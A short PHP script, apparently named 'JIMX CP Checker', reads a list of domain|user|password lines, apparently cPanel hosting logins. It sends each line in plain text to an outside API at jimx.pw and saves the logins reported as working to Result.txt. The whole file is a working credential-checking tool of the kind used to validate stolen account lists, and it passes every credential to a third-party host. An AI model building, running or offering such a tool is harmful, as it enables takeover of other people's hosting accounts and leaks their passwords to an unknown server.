<?php
function co(){
    echo "JIMX CP Checker\n";
    echo "Format : domain.com|user|pw (Tanpa https tanpa port)\n";
    echo "===============\n";
}

function check($list)
{
    $url = "https://jimx.pw/api/cp?cpx=" . $list;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    curl_close($ch);

    if ($result === "ok") {
        echo "[200] Work => " . $list . PHP_EOL;
        file_put_contents("Result.txt", $list."\n", FILE_APPEND);
    } else {
        echo "[404] Not Work => " . $list . PHP_EOL;
    }
}

co();
$input = readline("Input List: ");
if (($file = fopen($input, "r")) !== false) {
    $datas = explode("\r\n", fread($file, filesize($input)));
    foreach($datas as $data) {
        check($data);
    }
    fclose($file);
    echo "\n\nResult Saved on: Result.txt";
}
